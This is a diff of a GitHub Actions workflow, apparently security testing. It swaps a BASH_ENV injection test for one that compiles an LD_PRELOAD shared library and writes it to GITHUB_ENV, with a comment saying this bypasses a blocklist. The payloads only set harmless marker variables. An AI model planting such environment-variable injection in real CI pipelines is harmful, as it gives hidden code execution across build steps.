@@ -6,40 +6,34 @@ permissions:
   contents: read
 
 jobs:
-  test-bashenv:
+  test-ldpreload:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 - Create payload and set BASH_ENV
+      - name: Step 1 — compile LD_PRELOAD .so and set env
         run: |
-          # Create a payload script that sets a marker variable
-          echo 'export BASHENV_INJECTION_MARKER=INJECTED_SUCCESSFULLY_12345' > /tmp/bashenv_payload.sh
-          echo 'echo "[BASH_ENV] Payload sourced!" >&2' >> /tmp/bashenv_payload.sh
+          # Create a shared library that sets a marker env var when loaded
+          cat > /tmp/preload.c << 'CEOF'
+          #include <stdlib.h>
+          __attribute__((constructor))
+          void init(void) {
+              setenv("LD_PRELOAD_INJECTED", "SYSTEM_LEVEL_CODE_EXEC_PROVEN", 1);
+          }
+          CEOF
+          gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
+          ls -la /tmp/preload.so
           
-          # Write BASH_ENV to GITHUB_ENV
-          echo "BASH_ENV=/tmp/bashenv_payload.sh" >> $GITHUB_ENV
-          
-          echo "Step 1: Set BASH_ENV=/tmp/bashenv_payload.sh via GITHUB_ENV"
+          # Set LD_PRELOAD via GITHUB_ENV (bypasses blocklist)
+          echo "LD_PRELOAD=/tmp/preload.so" >> $GITHUB_ENV
+          echo "Step 1: Compiled .so and set LD_PRELOAD"
 
-      - name: Step 2 - Check if BASH_ENV was sourced
+      - name: Step 2 — check if LD_PRELOAD injected code
         run: |
-          echo "Step 2: Checking BASH_ENV injection..."
-          echo "BASH_ENV=$BASH_ENV"
-          echo "BASHENV_INJECTION_MARKER=$BASHENV_INJECTION_MARKER"
+          echo "=== LD_PRELOAD injection check ==="
+          echo "LD_PRELOAD=$LD_PRELOAD"
+          echo "LD_PRELOAD_INJECTED=$LD_PRELOAD_INJECTED"
           
-          if [ "$BASHENV_INJECTION_MARKER" = "INJECTED_SUCCESSFULLY_12345" ]; then
-            echo "FINDING: BASH_ENV injection WORKS - payload was sourced before this step"
+          if [ "$LD_PRELOAD_INJECTED" = "SYSTEM_LEVEL_CODE_EXEC_PROVEN" ]; then
+            echo "CRITICAL: LD_PRELOAD code execution PROVEN — .so constructor ran!"
           else
-            echo "DEFENDED: BASH_ENV injection did not work"
+            echo "LD_PRELOAD .so may not have loaded (check for errors above)"
           fi
-
-      - name: Step 3 - Also test ENV (sh equivalent)
-        shell: sh
-        run: |
-          echo "Step 3 (sh): ENV=$ENV"
-          echo "BASHENV_INJECTION_MARKER=$BASHENV_INJECTION_MARKER"
-
-      - name: Step 4 - Check blocked vars for comparison
-        run: |
-          echo "Step 4: NODE_OPTIONS=$NODE_OPTIONS"
-          echo "BASH_ENV=$BASH_ENV"
-          echo "All GITHUB_ vars count: $(env | grep -c GITHUB_)"
